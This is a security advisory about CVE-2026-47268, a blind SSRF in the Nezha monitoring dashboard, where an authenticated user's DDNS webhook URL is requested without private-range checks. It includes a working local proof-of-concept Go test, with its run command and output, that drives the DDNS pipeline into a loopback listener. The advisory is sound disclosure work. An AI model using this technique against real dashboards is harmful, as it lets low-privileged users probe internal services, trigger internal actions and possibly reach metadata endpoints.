# [M] Nezha's authenticated DDNS webhook configuration allows blind SSRF from the dashboard host

## Summary
Severity: Medium
Advisory: GHSA-6x26-5727-rrm9
CVE: CVE-2026-47268
CWE: CWE-918
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-05-29
Source: https://github.com/advisories/GHSA-6x26-5727-rrm9
Type: github-advisory

## Affected
- Go: `github.com/nezhahq/nezha` — affected >=0.20.0 <2.0.10
- Go: `github.com/naiba/nezha` — affected >=0.20.0

## Details
#### Summary

An authenticated Nezha dashboard user can create or update a DDNS profile with provider `webhook` and configure an arbitrary `webhook_url`, HTTP method, request body, and headers. When DDNS is triggered for a server that uses that profile, the dashboard process sends the configured request with `utils.HttpClient` without the SSRF protections used by notification webhooks.

This allows a low-privileged authenticated user who controls an owned server/DDNS profile to make the dashboard host issue HTTP requests to loopback or internal network services. The response body is not returned to the attacker in the confirmed path, so this is a blind SSRF / internal state-changing request primitive.

#### Details

The DDNS API is available to authenticated users, not only administrators:

- `cmd/dashboard/controller/controller.go:137` registers `GET /api/v1/ddns`.
- `cmd/dashboard/controller/controller.go:139` registers `POST /api/v1/ddns`.
- `cmd/dashboard/controller/controller.go:140` registers `PATCH /api/v1/ddns/:id`.

The create and update handlers copy attacker-controlled webhook fields directly from JSON request bodies into `model.DDNSProfile`:

- `cmd/dashboard/controller/ddns.go:47-74` accepts `model.DDNSForm` and stores `WebhookURL`, `WebhookMethod`, `WebhookRequestType`, `WebhookRequestBody`, and `WebhookHeaders`.
- `cmd/dashboard/controller/ddns.go:112-145` updates the same fields after profile ownership is checked.
- `model/ddns_api.go:11-15` exposes these fields as JSON input.
- `model/ddns.go:28-33` stores these fields on the persisted profile.

Users can attach owned DDNS profiles to owned servers, and DDNS updates are triggered in common server update and agent IP-reporting paths:

- `cmd/dashboard/controller/server.go:63-83` checks DDNS profile ownership, then stores `EnableDDNS`, `DDNSProfiles`, and `OverrideDDNSDomains` on an owned server.
- `service/singleton/server.go:44-58` calls `UpdateDDNS` when a server with DDNS enabled is updated.
- `service/rpc/nezha.go:247-279` calls `UpdateDDNS` when an authenticated agent reports a changed IP.

The DDNS provider dispatcher instantiates the webhook provider when `Provider == "webhook"`:

- `service/singleton/ddns.go:58-95`, especially `service/singleton/ddns.go:79-81`.

The sink is the DDNS webhook provider:

- `pkg/ddns/webhook/webhook.go:49-65` prepares and sends the HTTP request with `utils.HttpClient.Do(req)`.
- `pkg/ddns/webhook/webhook.go:85-100` formats and applies attacker-controlled headers.
- `pkg/ddns/webhook/webhook.go:91-92` creates the request with the configured method and URL.
- `pkg/ddns/webhook/webhook.go:117-134` parses the configured URL and only formats query parameters; it does not restrict scheme, host, IP range, or redirects.
- `pkg/ddns/webhook/webhook.go:137-158` builds attacker-controlled request bodies for POST/PATCH/PUT.

The project already contains SSRF defenses for notification webhooks, showing the expected mitigation pattern is absent from the DDNS webhook path:

- `model/notification.go:34-58` defines blocked private/reserved CIDRs.
- `model/notification.go:193-221` creates a notification HTTP client that resolves and pins a validated IP and disables redirects.
- `model/notification.go:229-263` only allows `http`/`https`, requires a hostname, resolves all addresses, and rejects disallowed IPs.
- `model/notification.go:265-276` rejects blocked ranges and non-global-unicast targets.

Equivalent validation was not found in `pkg/ddns/webhook/webhook.go`.

#### Safe local PoC

Environment:

- Repository: `https://github.com/nezhahq/nezha.git`
- Commit tested: `05e5da2535197fc223b79601d50eeea362dcf853`
- Tag at commit: `v2.0.9`
- Module: `github.com/nezhahq/nezha`
- Go version: `go1.26.3 linux/amd64`
- Testing scope: local-only; loopback HTTP listener and fake local UDP DNS SOA server only.

A temporary same-package test was created and removed automatically after execution. It used a local `httptest` listener as the internal service and a local UDP DNS server that returned an SOA for `example.com.`. The test then executed the normal DDNS update pipeline with a webhook DDNS profile pointing at the loopback HTTP listener.

Command run:

```bash
tmp="pkg/ddns/ddns_ssrf_local_poc_test.go"; trap 'rm -f "$tmp"' EXIT; cat > "$tmp" <<'EOF'
package ddns

import (
    "context"
    "io"
    "net"
    "net/http"
    "net/http/httptest"
    "testing"

    "github.com/miekg/dns"
    "github.com/nezhahq/nezha/model"
    "github.com/nezhahq/nezha/pkg/ddns/webhook"
)

func TestLocalPoCDDNSUpdatePipelineReachesLoopback(t *testing.T) {
    hit := make(chan string, 1)
    httpSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        body, _ := io.ReadAll(r.Body)
        hit <- r.Method + " " + r.URL.Path + " " + r.Header.Get("X-Proof") + " " + string(body)
        w.WriteHeader(http.StatusNoContent)
    }))
    defer httpSrv.Close()

    dnsPacketConn, err := net.ListenPacket("udp", "127.0.0.1:0")
    if err != nil {
        t.Fatal(err)
    }
    dnsSrv := &dns.Server{PacketConn: dnsPacketConn, Handler: dns.HandlerFunc(func(w dns.ResponseWriter, r *dns.Msg) {
        msg := new(dns.Msg)
        msg.SetReply(r)
        if len(r.Question) > 0 && r.Question[0].Qtype == dns.TypeSOA {
            msg.Answer = append(msg.Answer, &dns.SOA{
                Hdr:     dns.RR_Header{Name: "example.com.", Rrtype: dns.TypeSOA, Class: dns.ClassINET, Ttl: 60},
                Ns:      "ns.example.com.",
                Mbox:    "hostmaster.example.com.",
                Serial:  1,
                Refresh: 60,
                Retry:   60,
                Expire:  60,
                Minttl:  60,
            })
        }
        _ = w.WriteMsg(msg)
    })}
    go func() { _ = dnsSrv.ActivateAndServe() }()
    defer dnsSrv.Shutdown()

    enableIPv4 := true
    enableIPv6 := false
    profile := &model.DDNSProfile{
        EnableIPv4:         &enableIPv4,
        EnableIPv6:         &enableIPv6,
        MaxRetries:         1,
        Domains:            []string{"host.example.com"},
        Provider:           model.ProviderWebHook,
        WebhookURL:         httpSrv.URL + "/internal",
        WebhookMethod:      2,
        WebhookRequestType: 1,
        WebhookRequestBody: `{"ip":"#ip#","domain":"#domain#","type":"#type#"}`,
        WebhookHeaders:     `{"X-Proof":"nezha-ddns-pipeline-ssrf"}`,
    }
    provider := &Provider{
        DDNSProfile: profile,
        IPAddrs:     &model.IP{IPv4Addr: "203.0.113.10"},
        Setter:      &webhook.Provider{DDNSProfile: profile},
    }

    ctx := context.WithValue(context.Background(), DNSServerKey{}, []string{dnsPacketConn.LocalAddr().String()})
    if err := provider.updateDomain(ctx, "host.example.com"); err != nil {
        t.Fatalf("updateDomain returned error: %v", err)
    }

    select {
    case got := <-hit:
        t.Logf("observed loopback request through DDNS update pipeline: %s", got)
    default:
        t.Fatalf("expected loopback listener to receive DDNS webhook request")
    }
}
EOF
go test ./pkg/ddns -run TestLocalPoCDDNSUpdatePipelineReachesLoopback -v
```

Observed output:

```text
=== RUN   TestLocalPoCDDNSUpdatePipelineReachesLoopback
    ddns_ssrf_local_poc_test.go:76: observed loopback request through DDNS update pipeline: POST /internal nezha-ddns-pipeline-ssrf {"ip":"203.0.113.10","domain":"host.example.com","type":"ipv4"}
--- PASS: TestLocalPoCDDNSUpdatePipelineReachesLoopback (0.00s)
PASS
ok  	github.com/nezhahq/nezha/pkg/ddns	0.009s
```

A lower-level provider-only confirmation was also run with `go test ./pkg/ddns/webhook -run TestLocalPoCDDNSWebhookReachesLoopback -v` and observed:

```text
observed loopback request: POST /internal nezha-ddns-ssrf {"ip":"203.0.113.10","domain":"host.example.com","type":"ipv4"}
```

Cleanup:

- Both temporary PoC test files were removed by shell `trap`.
- `find . -path './.git' -prune -o \( -name 'ssrf_local_poc_test.go' -o -name 'ddns_ssrf_local_poc_test.go' \) -print` returned no files.

#### Impact

An authenticated dashboard user can cause the Nezha dashboard process to send arbitrary HTTP requests to services reachable from the dashboard host, including loopback and private network targets. The confirmed path allows attacker-controlled method, URL path/query, headers, and request body.

Potential impacts depend on deployment and reachable internal services, but include:

- Blind probing of internal HTTP services from the dashboard network location.
- Triggering state-changing internal endpoints that trust localhost or private network origins.
- Reaching services not exposed to the attacker directly.
- Interaction with cloud metadata or control-plane endpoints if reachable and not otherwise protected.

The response body is not returned to the attacker in the confirmed code path, so this should not be described as direct arbitrary internal file/secret read without an additional response-disclosure primitive.

## References
- https://github.com/nezhahq/nezha/security/advisories/GHSA-6x26-5727-rrm9
- https://nvd.nist.gov/vuln/detail/CVE-2026-47268
- https://github.com/nezhahq/nezha
